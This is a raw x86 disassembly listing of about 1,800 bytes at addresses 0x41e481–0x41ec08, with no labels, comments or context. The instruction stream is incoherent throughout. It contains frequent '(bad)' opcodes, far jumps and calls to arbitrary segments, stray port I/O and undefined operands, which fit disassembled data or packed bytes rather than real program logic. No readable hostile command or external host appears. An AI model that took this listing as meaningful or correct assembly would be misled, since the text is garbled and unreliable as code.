  41e481:	repz mov ds:0x3b7d09ed,eax
  41e487:	add    DWORD PTR [esi+0x6015d8cc],edx
  41e48d:	jecxz  0x41e4a1
  41e48f:	loope  0x41e502
  41e491:	pop    edx
  41e492:	and    BYTE PTR es:[ecx+ebp*1+0x1e],bh
  41e497:	or     DWORD PTR [edx-0x39],edx
  41e49a:	push   ds
  41e49b:	adc    cl,BYTE PTR [edx]
  41e49d:	sbb    DWORD PTR [ecx+0x3dd89ae],ecx
  41e4a3:	or     al,cl
  41e4a5:	stos   BYTE PTR es:[edi],al
  41e4a6:	ficom  DWORD PTR [ebx]
  41e4a8:	fsubr  DWORD PTR [ebx+ecx*8+0x65]
  41e4ac:	(bad)
  41e4af:	std    
  41e4b0:	push   ds
  41e4b1:	push   cs
  41e4b2:	daa    
  41e4b3:	aas    
  41e4b4:	pushf  
  41e4b5:	adc    cl,BYTE PTR ds:0x73cd5702
  41e4bb:	int3   
  41e4bc:	sti    
  41e4bd:	xchg   BYTE PTR [eax+0x4b],dl
  41e4c0:	jae    0x41e505
  41e4c2:	add    ah,dh
  41e4c4:	in     eax,0x3
  41e4c6:	adc    al,0x36
  41e4c8:	jno    0x41e496
  41e4ca:	sub    esp,DWORD PTR [esp+edx*2]
  41e4cd:	call   0xe159d3b3
  41e4d2:	dec    edx
  41e4d3:	std    
  41e4d4:	or     edi,edi
  41e4d6:	out    0xc6,al
  41e4d8:	call   0xc43f:0x7d355a7c
  41e4df:	popa   
  41e4e0:	in     eax,0xaf
  41e4e2:	mov    dh,0xaf
  41e4e4:	(bad)  [edi+0x3c]
  41e4e7:	(bad)  
  41e4e8:	std    
  41e4e9:	addr16 lahf 
  41e4eb:	pop    ecx
  41e4ec:	in     eax,dx
  41e4ed:	and    DWORD PTR [edi],edx
  41e4ef:	xchg   esi,eax
  41e4f0:	sub    al,0x87
  41e4f2:	sahf   
  41e4f3:	jmp    0xdac7:0x263626e
  41e4fa:	(bad)  
  41e4fb:	je     0x41e534
  41e4fd:	pop    es
  41e4fe:	retf   0xeb92
  41e501:	mov    ebp,0x5e3f2598
  41e506:	retf   0x7eb5
  41e509:	mov    dh,0x49
  41e50b:	mov    dh,bh
  41e50d:	mov    esi,0xda4759e2
  41e512:	out    0xe5,eax
  41e514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e515:	mov    ebp,0xd11fc658
  41e51a:	xchg   ebp,eax
  41e51b:	mov    ecx,0xa706de8f
  41e520:	js     0x41e571
  41e522:	dec    eax
  41e523:	call   0xf2bc:0x76070baa
  41e52a:	xor    al,0x99
  41e52c:	and    DWORD PTR [esi-0x28d5b198],eax
  41e532:	je     0x41e50c
  41e534:	push   0x6a998bd6
  41e539:	sbb    ebx,DWORD PTR [esi+0x19]
  41e53c:	add    al,0xf2
  41e53e:	pop    ebp
  41e53f:	mov    dl,0x97
  41e541:	push   esp
  41e542:	cmp    eax,DWORD PTR ds:0x127acea7
  41e548:	xor    al,0x9d
  41e54a:	jle    0x41e5cb
  41e54c:	repnz inc esi
  41e54e:	scas   al,BYTE PTR es:[edi]
  41e54f:	call   0xe63783ca
  41e554:	push   cs
  41e555:	sar    BYTE PTR [esi+edx*1+0x78],cl
  41e559:	popf   
  41e55a:	cmp    dl,BYTE PTR ds:0x82272385
  41e560:	cmp    eax,0x3f995a65
  41e565:	dec    esp
  41e566:	and    DWORD PTR [ecx-0x4f13ac34],edi
  41e56c:	lods   al,BYTE PTR ds:[esi]
  41e56d:	jns    0x41e50c
  41e56f:	or     dh,dh
  41e571:	ds aam 0xd8
  41e574:	adc    eax,0xf5f60574
  41e579:	test   eax,0xc41c845c
  41e57e:	mov    ch,0xc0
  41e580:	mov    edx,0xbfbfaf67
  41e585:	dec    ebp
  41e586:	and    BYTE PTR [edx+edx*8+0x142a087b],ah
  41e58d:	aam    0x0
  41e58f:	rcl    DWORD PTR [eax+ebx*2-0x324f6e12],1
  41e596:	inc    edi
  41e597:	or     ebp,esi
  41e599:	sar    edi,cl
  41e59b:	pop    edx
  41e59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59d:	sub    al,0x57
  41e59f:	jl     0x41e5a3
  41e5a1:	dec    ebp
  41e5a2:	(bad)  
  41e5a3:	mov    WORD PTR [ecx-0x1a6f19f6],gs
  41e5a9:	(bad)  
  41e5aa:	stc    
  41e5ab:	xor    al,0xea
  41e5ad:	fst    DWORD PTR [edx]
  41e5af:	je     0x41e583
  41e5b1:	xchg   ebp,esi
  41e5b3:	rcl    BYTE PTR [ebx],0x20
  41e5b6:	(bad)  
  41e5b7:	sub    al,0x17
  41e5b9:	adc    bh,BYTE PTR [eiz*2+0xe907fb4]
  41e5c0:	mov    ebx,0x671fa194
  41e5c5:	lea    ebx,ds:0x84be838a
  41e5cb:	into   
  41e5cc:	ins    DWORD PTR es:[edi],dx
  41e5cd:	test   esi,esp
  41e5cf:	cmp    DWORD PTR [esi-0x4f],edi
  41e5d2:	cmp    bh,BYTE PTR [ebp-0x79]
  41e5d5:	xor    DWORD PTR [edx],eax
  41e5d7:	dec    ebp
  41e5d8:	lahf   
  41e5d9:	jo     0x41e63f
  41e5db:	jmp    0xc2e4:0xe445
  41e5e1:	xor    BYTE PTR [eax-0x37],bh
  41e5e4:	mov    al,ds:0x74b3a164
  41e5e9:	cmp    eax,0x7221cfb8
  41e5ee:	xor    eax,0x87144086
  41e5f3:	fsubr  QWORD PTR [ebp+0x4e]
  41e5f6:	jecxz  0x41e593
  41e5f8:	mov    ds:0x56fde81a,al
  41e5fd:	sub    al,0x7c
  41e5ff:	retf   
  41e600:	sub    al,0xa9
  41e602:	adc    dh,dl
  41e604:	push   0x6c
  41e606:	repz xchg ebx,eax
  41e608:	dec    esp
  41e609:	jmp    0x6e26:0x68d40346
  41e610:	or     ebp,DWORD PTR [ebp-0x2b]
  41e613:	mov    ah,0xc9
  41e615:	xchg   esi,eax
  41e616:	cmp    BYTE PTR [edi+0xe],0xee
  41e61a:	jle    0x41e5eb
  41e61c:	push   0xffffffbc
  41e61e:	dec    esi
  41e61f:	mov    ?,edi
  41e621:	xor    ah,ch
  41e623:	sbb    BYTE PTR [ebp-0x57],bh
  41e626:	iret   
  41e627:	adc    cl,BYTE PTR [esi]
  41e629:	xor    cl,cl
  41e62b:	mov    WORD PTR [eax-0x33698c10],?
  41e631:	imul   edi,eax,0xffffffc0
  41e634:	dec    esp
  41e635:	ret    
  41e636:	and    eax,esp
  41e638:	(bad)  
  41e639:	adc    BYTE PTR [ecx-0x45],cl
  41e63c:	jae    0x41e6b7
  41e63e:	out    0xcf,eax
  41e640:	xchg   esi,eax
  41e641:	pop    ebp
  41e642:	stos   BYTE PTR es:[edi],al
  41e643:	(bad)  [eax]
  41e645:	int    0x37
  41e647:	add    al,0xe4
  41e649:	je     0x41e608
  41e64b:	int    0xe5
  41e64d:	bnd jae 0x41e671
  41e650:	and    eax,edi
  41e652:	hlt    
  41e653:	mov    ds:0x5921375c,al
  41e658:	dec    edi
  41e659:	sub    BYTE PTR [esi+0x54],ch
  41e65c:	and    edi,DWORD PTR [edi-0x6]
  41e65f:	and    ch,BYTE PTR [edi+0xeac1587]
  41e665:	gs cmp al,0xe0
  41e668:	sti    
  41e669:	shr    BYTE PTR [edi-0x58e06046],0x82
  41e670:	sub    BYTE PTR [ecx+0x7d],ch
  41e673:	mov    esi,0x4d5232fd
  41e678:	out    0xc5,eax
  41e67a:	xlat   BYTE PTR ds:[ebx]
  41e67b:	int    0xed
  41e67d:	das    
  41e67e:	pop    ss
  41e67f:	dec    edi
  41e680:	mov    al,0xa0
  41e682:	dec    edx
  41e683:	pop    ss
  41e684:	lahf   
  41e685:	jge    0x41e6f3
  41e687:	cs adc eax,0x8203acf0
  41e68d:	add    al,0x74
  41e68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e690:	loope  0x41e6cc
  41e692:	pop    ebp
  41e693:	cmc    
  41e694:	cmp    al,ch
  41e696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e697:	mov    edi,DWORD PTR [esi+0x74]
  41e69a:	and    BYTE PTR [ecx-0x7f86c6c6],dl
  41e6a0:	aam    0xa9
  41e6a2:	mov    DWORD PTR [ebx],eax
  41e6a4:	dec    esi
  41e6a5:	inc    edi
  41e6a6:	mov    edx,0x5f6600d
  41e6ab:	adc    eax,0xed985284
  41e6b0:	xor    bl,BYTE PTR ds:0x6be1cdec
  41e6b6:	ins    BYTE PTR es:[edi],dx
  41e6b7:	mov    edx,0x4570c77e
  41e6bc:	mov    edi,0x6cb4e2e4
  41e6c1:	cwde   
  41e6c2:	int3   
  41e6c3:	stos   BYTE PTR es:[edi],al
  41e6c4:	xor    DWORD PTR [edi-0x77],edi
  41e6c7:	push   ebx
  41e6c8:	aam    0x91
  41e6ca:	jns    0x41e73e
  41e6cc:	data16 add dh,BYTE PTR [edi-0x24]
  41e6d0:	stos   DWORD PTR es:[edi],eax
  41e6d1:	push   edx
  41e6d2:	test   eax,0x938a71af
  41e6d7:	es dec esp
  41e6d9:	scas   eax,DWORD PTR es:[edi]
  41e6da:	add    al,ch
  41e6dc:	inc    esp
  41e6dd:	dec    BYTE PTR [eax-0x49]
  41e6e0:	test   eax,0x24a525dc
  41e6e5:	pop    eax
  41e6e6:	fcom   DWORD PTR [esi+0xdbff812]
  41e6ec:	adc    al,0x4e
  41e6ee:	loope  0x41e6f5
  41e6f0:	icebp  
  41e6f1:	cmp    DWORD PTR [esi-0x17],0xfffffff1
  41e6f5:	aas    
  41e6f6:	cmp    DWORD PTR [eax],edx
  41e6f8:	pop    DWORD PTR [ebp-0x64ba80a5]
  41e6fe:	cmp    ecx,DWORD PTR cs:[eax]
  41e701:	lods   al,BYTE PTR ds:[esi]
  41e702:	add    DWORD PTR gs:[esi-0x4e608b85],ebx
  41e709:	mov    ah,0xf4
  41e70b:	call   0x3cde:0x9c60d0be
  41e712:	or     dh,ah
  41e714:	sub    esi,edi
  41e716:	outs   dx,BYTE PTR ds:[esi]
  41e717:	mov    WORD PTR [ebx+0xa208663],gs
  41e71d:	push   ebx
  41e71e:	out    dx,eax
  41e71f:	(bad)  
  41e720:	ss (bad) 
  41e722:	das    
  41e723:	pop    edi
  41e724:	xchg   ebp,eax
  41e725:	jmp    DWORD PTR [edx-0x67f3654e]
  41e72b:	pop    edx
  41e72c:	jb     0x41e6bc
  41e72e:	nop
  41e72f:	(bad)  
  41e730:	xor    dh,BYTE PTR [eax+eiz*2-0x9]
  41e734:	aas    
  41e735:	mov    ebx,eax
  41e737:	push   ds
  41e738:	jae    0x41e774
  41e73a:	and    al,0x47
  41e73c:	dec    edi
  41e73d:	sahf   
  41e73e:	push   ecx
  41e73f:	pop    esp
  41e740:	shr    DWORD PTR [edx],1
  41e742:	ins    BYTE PTR es:[edi],dx
  41e743:	rcr    bh,0x66
  41e746:	mov    ebp,0x32b63bb2
  41e74b:	lock imul edx,DWORD PTR [eax],0x7a8174ec
  41e752:	shl    BYTE PTR [ebx-0x32c8af6c],0xb3
  41e759:	inc    esp
  41e75a:	call   0x86c93734
  41e75f:	(bad)  
  41e760:	outs   dx,DWORD PTR ds:[esi]
  41e761:	add    DWORD PTR [ecx],0x18
  41e764:	push   ebp
  41e765:	adc    cl,ch
  41e767:	out    0x3a,eax
  41e769:	jp     0x41e755
  41e76b:	xchg   ecx,eax
  41e76c:	dec    edx
  41e76d:	gs cmc 
  41e76f:	mov    ebx,0x676e0733
  41e774:	inc    esp
  41e775:	inc    ecx
  41e776:	inc    ebx
  41e777:	sbb    BYTE PTR ds:0x9de0fdc9,dh
  41e77d:	lock mov edi,0x2729ecac
  41e783:	lahf   
  41e784:	lods   eax,DWORD PTR ds:[esi]
  41e785:	xlat   BYTE PTR ds:[ebx]
  41e786:	nop
  41e787:	jl     0x41e7a2
  41e789:	dec    BYTE PTR ds:0x213970c3
  41e78f:	gs xchg edi,eax
  41e791:	test   ch,dl
  41e793:	mov    ebp,0x62651b1f
  41e798:	mov    dh,dh
  41e79a:	and    eax,0x95c0b89b
  41e79f:	push   edx
  41e7a0:	lods   eax,DWORD PTR ds:[esi]
  41e7a1:	pop    ss
  41e7a2:	sbb    bl,BYTE PTR gs:[ebx-0x2976fa16]
  41e7a9:	int3   
  41e7aa:	(bad)  
  41e7ab:	xchg   ecx,eax
  41e7ac:	xchg   esi,eax
  41e7ad:	mov    dh,0x3b
  41e7af:	call   0xc7727ee9
  41e7b4:	mov    ebx,0xf3810365
  41e7b9:	or     ah,ch
  41e7bb:	enter  0x7ce1,0x46
  41e7bf:	and    al,0x39
  41e7c1:	not    DWORD PTR [eax+ebp*2]
  41e7c4:	stc    
  41e7c5:	je     0x41e76f
  41e7c7:	push   eax
  41e7c8:	xchg   DWORD PTR [edx-0x112e1156],esi
  41e7ce:	mov    ebx,DWORD PTR [ecx-0x2125fbd0]
  41e7d4:	add    eax,0xa2550c05
  41e7d9:	int    0x11
  41e7db:	adc    al,0xac
  41e7dd:	or     dh,bl
  41e7df:	retf   0xb22e
  41e7e2:	xchg   esi,eax
  41e7e3:	scas   al,BYTE PTR es:[edi]
  41e7e4:	jo     0x41e789
  41e7e6:	retf   0xa3c3
  41e7e9:	cmp    eax,0x2ff1ab31
  41e7ee:	pshufw mm2,QWORD PTR [edx-0x42780f8d],0xf4
  41e7f6:	xchg   ebx,eax
  41e7f7:	gs dec edx
  41e7f9:	cwde   
  41e7fa:	mov    al,ds:0x4d087c79
  41e7ff:	loope  0x41e7b7
  41e801:	mov    ecx,DWORD PTR [esi+edx*2-0x41faf8ee]
  41e808:	popa   
  41e809:	(bad)  
  41e80a:	je     0x41e84e
  41e80c:	push   esp
  41e80d:	les    eax,FWORD PTR [edi+0xd]
  41e810:	dec    ebx
  41e811:	inc    eax
  41e812:	das    
  41e813:	data16 clc 
  41e815:	sbb    DWORD PTR [ebx-0x7e9ad198],ecx
  41e81b:	out    0xc2,al
  41e81d:	mov    edi,0xb7ff220d
  41e822:	push   ss
  41e823:	rol    edi,0x40
  41e826:	in     al,dx
  41e827:	in     eax,0x67
  41e829:	cmp    al,0x7f
  41e82b:	mov    esp,0xdd9f3c12
  41e830:	mov    ds,eax
  41e832:	test   DWORD PTR [ecx-0x41fd41fe],edx
  41e838:	test   DWORD PTR [eax+0xc],eax
  41e83b:	jle    0x41e859
  41e83d:	jge    0x41e887
  41e83f:	xor    ah,BYTE PTR [esi+0x3f]
  41e842:	out    dx,al
  41e843:	xchg   esi,eax
  41e844:	outs   dx,DWORD PTR ds:[esi]
  41e845:	scas   eax,DWORD PTR es:[edi]
  41e846:	sub    ch,BYTE PTR [ebp-0x7e]
  41e849:	mov    edi,0x4ddfac60
  41e84e:	in     al,dx
  41e84f:	xor    ebx,DWORD PTR [edi]
  41e851:	xor    al,0x71
  41e853:	cmp    esp,DWORD PTR [esi+esi*4-0x27459bc8]
  41e85a:	push   ss
  41e85b:	cs gs sti 
  41e85e:	jns    0x41e83b
  41e860:	fidivr WORD PTR [ecx+0x10]
  41e863:	or     ch,BYTE PTR [esi+0x60c210e2]
  41e869:	cli    
  41e86a:	sbb    BYTE PTR [esi],cl
  41e86c:	add    DWORD PTR [esi+0x40],edi
  41e86f:	repnz sub ah,BYTE PTR [edx+ebx*4-0x6]
  41e874:	or     ebp,ebx
  41e876:	ds stos BYTE PTR es:[edi],al
  41e878:	xchg   edi,eax
  41e879:	adc    al,ch
  41e87b:	loope  0x41e89b
  41e87d:	or     al,0xe4
  41e87f:	ins    DWORD PTR es:[edi],dx
  41e880:	push   edi
  41e881:	or     ecx,ecx
  41e883:	pop    esi
  41e884:	or     esp,DWORD PTR fs:[ebx-0x1c750dfe]
  41e88b:	xor    BYTE PTR [eax+0x39],al
  41e88e:	inc    edi
  41e88f:	dec    edi
  41e890:	rcl    DWORD PTR [ecx+0x5642d130],cl
  41e896:	mov    eax,ds:0x632bd811
  41e89b:	add    DWORD PTR [eax-0x41978e8a],esi
  41e8a1:	mov    eax,ds:0x4f649a42
  41e8a6:	add    eax,0x2d7270ad
  41e8ab:	mov    es,WORD PTR [esi+edi*1-0x1a60e75c]
  41e8b2:	aam    0xa4
  41e8b4:	sahf   
  41e8b5:	push   es
  41e8b6:	inc    esi
  41e8b7:	(bad)  
  41e8b8:	jne    0x41e8a6
  41e8ba:	cs adc al,0xfe
  41e8bd:	jns    0x41e8e0
  41e8bf:	bound  eax,QWORD PTR [esi+0xd]
  41e8c2:	lea    ebp,[ebp+0x3cb8b8f1]
  41e8c8:	adc    DWORD PTR [esi],ebp
  41e8ca:	addr16 inc edi
  41e8cc:	in     al,0x67
  41e8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8cf:	jecxz  0x41e85a
  41e8d1:	and    ah,dh
  41e8d3:	loope  0x41e872
  41e8d5:	stos   DWORD PTR es:[edi],eax
  41e8d6:	sti    
  41e8d7:	(bad)  
  41e8d8:	imul   edx,DWORD PTR [ebp+eiz*8-0x4b],0x77f646b0
  41e8e0:	cwde   
  41e8e1:	and    BYTE PTR [edi+edx*4+0x1a],dl
  41e8e5:	cli    
  41e8e6:	pusha  
  41e8e7:	pop    esp
  41e8e8:	push   edi
  41e8e9:	mov    cl,0x50
  41e8eb:	scas   al,BYTE PTR es:[edi]
  41e8ec:	repnz sub BYTE PTR [ecx],al
  41e8ef:	dec    edx
  41e8f0:	mov    bl,0x15
  41e8f2:	dec    edx
  41e8f3:	jnp    0x41e959
  41e8f5:	lds    eax,FWORD PTR [edi-0x3db870c5]
  41e8fb:	pop    ss
  41e8fc:	mov    edx,0x2c352708
  41e901:	push   ecx
  41e902:	cdq    
  41e903:	pop    edi
  41e904:	and    al,0xca
  41e906:	push   edx
  41e907:	imul   eax,DWORD PTR [eax*2+0x45169aa2],0xffffff83
  41e90f:	test   BYTE PTR [esi+ebp*8-0x25aa42b6],al
  41e916:	mov    ah,0x65
  41e918:	jo     0x41e905
  41e91a:	xchg   DWORD PTR [esp+eiz*8+0x3af04e86],edi
  41e921:	xor    BYTE PTR [edi+0x22047fc6],0x20
  41e928:	fs add al,0xaa
  41e92b:	clc    
  41e92c:	and    dl,cl
  41e92e:	xor    esi,DWORD PTR [esi+0x4]
  41e931:	sub    DWORD PTR [edx],edx
  41e933:	neg    BYTE PTR [edi+0x7f]
  41e936:	nop
  41e937:	dec    ax
  41e939:	ret    
  41e93a:	or     al,0x5
  41e93c:	lds    ebx,FWORD PTR [ecx]
  41e93e:	adc    eax,0x50c16294
  41e943:	and    DWORD PTR [edx-0x2ea412aa],esi
  41e949:	sbb    al,0xca
  41e94b:	fwait
  41e94c:	add    al,0x2d
  41e94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e94f:	and    cl,dl
  41e951:	pop    edi
  41e952:	mov    cs,WORD PTR [edi-0x6]
  41e955:	dec    eax
  41e956:	pop    edx
  41e957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e958:	xchg   esi,eax
  41e959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e95a:	inc    eax
  41e95b:	loop   0x41e947
  41e95d:	pushf  
  41e95e:	jb     0x41e9c0
  41e960:	cs popf 
  41e962:	mov    al,0x26
  41e964:	lods   eax,DWORD PTR ds:[esi]
  41e965:	imul   ebx,DWORD PTR [edi+0x2baaa1d4],0x149f6cf7
  41e96f:	or     esi,ebx
  41e971:	add    BYTE PTR [edx+0x6febfdb7],0x86
  41e978:	and    edx,DWORD PTR [eax-0x6]
  41e97b:	out    dx,al
  41e97c:	cmp    BYTE PTR [edi-0x35d03fd0],bh
  41e982:	or     eax,0x4f7ceb50
  41e987:	add    al,0x5c
  41e989:	sahf   
  41e98a:	sub    WORD PTR [eax+0x4e3c922d],si
  41e991:	in     eax,0xbc
  41e993:	sbb    eax,0x8de1e22e
  41e998:	mov    ch,BYTE PTR [ebp+ecx*1-0x18d0ed4e]
  41e99f:	inc    edx
  41e9a0:	mov    bh,BYTE PTR [edx]
  41e9a2:	adc    edi,DWORD PTR [edi-0x25]
  41e9a5:	(bad)
  41e9a9:	mov    ebp,DWORD PTR [edx-0x2d]
  41e9ac:	bound  ecx,QWORD PTR [edx]
  41e9ae:	std    
  41e9af:	push   es
  41e9b0:	clc    
  41e9b1:	adc    eax,0x1bc0928d
  41e9b6:	inc    eax
  41e9b7:	mov    cl,0x1b
  41e9b9:	(bad)  [ebp-0x27360ee5]
  41e9bf:	xlat   BYTE PTR ds:[ebx]
  41e9c0:	cmp    eax,edx
  41e9c2:	jle    0x41e9be
  41e9c4:	ins    BYTE PTR es:[edi],dx
  41e9c5:	jnp    0x41e9a1
  41e9c7:	jns    0x41ea26
  41e9c9:	or     ecx,DWORD PTR [ebx-0x56e73845]
  41e9cf:	xchg   esi,eax
  41e9d0:	repz mov ebp,0x2af67e7f
  41e9d6:	cmc    
  41e9d7:	or     ebx,DWORD PTR [edx]
  41e9d9:	shr    BYTE PTR [eax-0x2],0xa5
  41e9dd:	(bad)  
  41e9de:	jnp    0x41ea47
  41e9e0:	jge    0x41e993
  41e9e2:	call   DWORD PTR [esi+0x4c0fcb46]
  41e9e8:	adc    eax,0x66968e2f
  41e9ed:	imul   DWORD PTR [ebp+0x1cf2f585]
  41e9f3:	sbb    DWORD PTR [esi+0x163d5ed3],ebx
  41e9f9:	jb     0x41e9b3
  41e9fb:	or     BYTE PTR [esi+0x3b],al
  41e9fe:	inc    eax
  41e9ff:	ss push cs
  41ea01:	jmp    0x41e9bb
  41ea03:	outs   dx,DWORD PTR ds:[esi]
  41ea04:	lea    esi,[ecx-0x63]
  41ea07:	fnsave [edi]
  41ea09:	sahf   
  41ea0a:	int3   
  41ea0b:	clc    
  41ea0c:	call   0xa8f5:0x8e5a7bc9
  41ea13:	xchg   edi,eax
  41ea14:	stc    
  41ea15:	test   al,0x40
  41ea17:	fstp   TBYTE PTR [edx]
  41ea19:	xchg   ebp,eax
  41ea1a:	out    dx,eax
  41ea1b:	fwait
  41ea1c:	cmc    
  41ea1d:	mov    ch,0x2b
  41ea1f:	ret    
  41ea20:	cmp    ebx,DWORD PTR [ecx-0x2e]
  41ea23:	adc    esi,0x2a32e492
  41ea29:	into   
  41ea2a:	mov    DWORD PTR [ebp+0x597bf11e],esi
  41ea30:	pop    edx
  41ea31:	xlat   BYTE PTR ds:[ebx]
  41ea32:	rol    DWORD PTR [edx],cl
  41ea34:	fild   WORD PTR [ebp-0x70e9275e]
  41ea3a:	sub    ebx,DWORD PTR [edx-0x7e]
  41ea3d:	ja     0x41e9f6
  41ea3f:	and    al,0xb6
  41ea41:	push   edx
  41ea42:	sub    eax,0xe95b5a7
  41ea47:	loope  0x41ea5b
  41ea49:	pop    ds
  41ea4a:	adc    BYTE PTR [ebx+0x71d2c362],0xdb
  41ea51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea52:	sbb    BYTE PTR [edx+0x4b4952e5],bh
  41ea58:	data16 jl 0x41ead6
  41ea5b:	in     eax,dx
  41ea5c:	push   ebx
  41ea5d:	pop    DWORD PTR [edx]
  41ea5f:	and    eax,ecx
  41ea61:	lds    ebx,FWORD PTR [ebx]
  41ea63:	jmp    0x41ea70
  41ea65:	pusha  
  41ea66:	jbe    0x41eac3
  41ea68:	xor    al,0xce
  41ea6a:	shr    esp,1
  41ea6c:	sbb    eax,0xa893e0eb
  41ea71:	cmp    DWORD PTR [edi-0xb],edx
  41ea74:	push   cs
  41ea75:	call   0x693d01da
  41ea7a:	icebp  
  41ea7b:	sub    DWORD PTR [esi+0x6dc29a8],ebp
  41ea81:	fadd   QWORD PTR [ebp-0x46df79c4]
  41ea87:	push   esp
  41ea88:	iret   
  41ea89:	add    dh,BYTE PTR [ecx-0x40]
  41ea8c:	(bad)  
  41ea8d:	iret   
  41ea8e:	in     al,dx
  41ea8f:	pop    ebp
  41ea90:	xor    bl,bh
  41ea92:	jae    0x41ea57
  41ea94:	call   0xd700904c
  41ea99:	add    al,0xb6
  41ea9b:	jbe    0x41eb17
  41ea9d:	jp     0x41ea3a
  41ea9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa1:	(bad)  
  41eaa2:	and    al,0x8c
  41eaa4:	mov    WORD PTR [ebx-0x2d9eb46b],ds
  41eaaa:	xor    eax,0x80c89a27
  41eaaf:	push   esp
  41eab0:	ret    0x6a7b
  41eab3:	out    dx,al
  41eab4:	mov    ah,0x4d
  41eab6:	jg     0x41eb37
  41eab8:	pop    ds
  41eab9:	sub    eax,0xd21b8cb4
  41eabe:	xchg   edi,eax
  41eabf:	or     DWORD PTR [ecx],esp
  41eac1:	push   0xffffffd5
  41eac3:	add    eax,0x2e51039
  41eac8:	(bad)
  41eacb:	dec    ecx
  41eacc:	mov    ax,ds:0xfcb2bf0b
  41ead2:	jmp    0x45f0e5df
  41ead7:	mov    WORD PTR [esi],es
  41ead9:	push   ss
  41eada:	cmp    BYTE PTR [edx-0x23],ah
  41eadd:	mov    bl,0xfc
  41eadf:	ins    BYTE PTR es:[edi],dx
  41eae0:	adc    edx,DWORD PTR ds:0x4b7d1ab1
  41eae6:	test   eax,0xec92ae8e
  41eaeb:	imul   edx,ebx,0xceadf9b2
  41eaf1:	gs cdq 
  41eaf3:	push   ebp
  41eaf4:	out    dx,eax
  41eaf5:	pop    ss
  41eaf6:	fs aas 
  41eaf8:	jae    0x41eacf
  41eafa:	cmp    al,0x9f
  41eafc:	or     bl,BYTE PTR [ebx+0x6d]
  41eaff:	stos   BYTE PTR es:[edi],al
  41eb00:	std    
  41eb01:	adc    eax,0xe2346e1c
  41eb06:	scas   eax,DWORD PTR es:[edi]
  41eb07:	jge    0x41eab7
  41eb09:	test   eax,esi
  41eb0b:	mov    ebp,0x46c29a47
  41eb10:	retf   
  41eb11:	mov    ebp,DWORD PTR [edi+ebp*2-0x71]
  41eb15:	outs   dx,DWORD PTR ds:[esi]
  41eb16:	inc    ebx
  41eb17:	int3   
  41eb18:	je     0x41eb53
  41eb1a:	stos   BYTE PTR es:[edi],al
  41eb1b:	les    edx,FWORD PTR [ebx-0x39c653dc]
  41eb21:	mov    bh,0x1
  41eb23:	inc    esi
  41eb24:	shl    DWORD PTR [esp+edx*1],0xaa
  41eb28:	adc    eax,0x4aad8d72
  41eb2d:	sub    eax,0xedc67b7b
  41eb32:	sar    edx,0x77
  41eb35:	and    BYTE PTR [edi+0x48],al
  41eb38:	add    ebp,esp
  41eb3a:	cmp    DWORD PTR [esi],ebp
  41eb3c:	(bad)  
  41eb3e:	jle    0x41eb71
  41eb40:	fld    DWORD PTR [ebx-0x68]
  41eb43:	in     eax,dx
  41eb44:	ins    BYTE PTR es:[edi],dx
  41eb45:	sub    al,0xbf
  41eb47:	retf   
  41eb48:	jno    0x41eb3b
  41eb4a:	push   cs
  41eb4b:	cmp    dh,BYTE PTR ds:0x47d51e38
  41eb51:	cmc    
  41eb52:	fdivp  st(4),st
  41eb54:	popa   
  41eb55:	out    0x98,eax
  41eb57:	add    ch,BYTE PTR [esi-0x5e]
  41eb5a:	mov    ds:0x7ff39419,eax
  41eb5f:	mov    bl,0x68
  41eb61:	mov    WORD PTR [edi],gs
  41eb63:	pop    es
  41eb64:	or     al,0xd3
  41eb66:	mov    bh,0x97
  41eb68:	jge    0x41eb64
  41eb6a:	jbe    0x41eb7c
  41eb6c:	test   al,0xea
  41eb6e:	cmc    
  41eb6f:	mov    ecx,0xe9320402
  41eb74:	push   esi
  41eb75:	gs sub eax,0x6cc98725
  41eb7b:	out    0xcf,al
  41eb7d:	sbb    ebx,DWORD PTR [edi-0x1a2c9681]
  41eb83:	add    DWORD PTR [edx-0x6],edi
  41eb86:	in     eax,dx
  41eb87:	inc    ebx
  41eb88:	lds    eax,FWORD PTR [ebp-0x1195c3f2]
  41eb8e:	lods   eax,DWORD PTR ds:[esi]
  41eb8f:	in     al,0x18
  41eb91:	test   BYTE PTR [ebx+0x66a961fa],bh
  41eb97:	mov    eax,DWORD PTR [esi]
  41eb99:	ret    0xbe07
  41eb9c:	jae    0x41ec03
  41eb9e:	jbe    0x41ec1f
  41eba0:	shl    BYTE PTR [ecx-0x33e2e11d],0x12
  41eba7:	cmp    al,0x7e
  41eba9:	push   ebp
  41ebaa:	(bad)  
  41ebab:	scas   eax,DWORD PTR es:[edi]
  41ebac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebad:	or     DWORD PTR [ecx],edx
  41ebaf:	jle    0x41ebcc
  41ebb1:	call   0xa3f68abd
  41ebb6:	or     al,0xae
  41ebb8:	je     0x41eb5b
  41ebba:	ret    
  41ebbb:	ds (bad) 
  41ebbd:	imul   BYTE PTR [eax]
  41ebbf:	(bad)  
  41ebc0:	out    0x97,al
  41ebc2:	jmp    0x4997:0x75421b85
  41ebc9:	sbb    eax,0x70c5134b
  41ebce:	(bad)
  41ebd1:	fild   WORD PTR [esi+0x30a65875]
  41ebd7:	addr16 push edx
  41ebd9:	pusha  
  41ebda:	gs lahf 
  41ebdc:	cmp    BYTE PTR [esp+esi*4+0x643956e5],bh
  41ebe3:	imul   edi,eax,0x58
  41ebe6:	lods   al,BYTE PTR ds:[esi]
  41ebe7:	cmp    ecx,esp
  41ebe9:	mov    al,0xef
  41ebeb:	jmp    0xe8bc:0xb527ce12
  41ebf2:	pop    edx
  41ebf3:	mov    ds:0x770fddea,al
  41ebf8:	shl    BYTE PTR [bx+di+0x4b],1
  41ebfc:	fs rol ecx,0x1c
  41ec00:	in     al,0x69
  41ec02:	fsubr  QWORD PTR [ecx-0x32]
  41ec05:	mov    cl,0x70
  41ec07:	push   eax
  41ec08:	push   ss
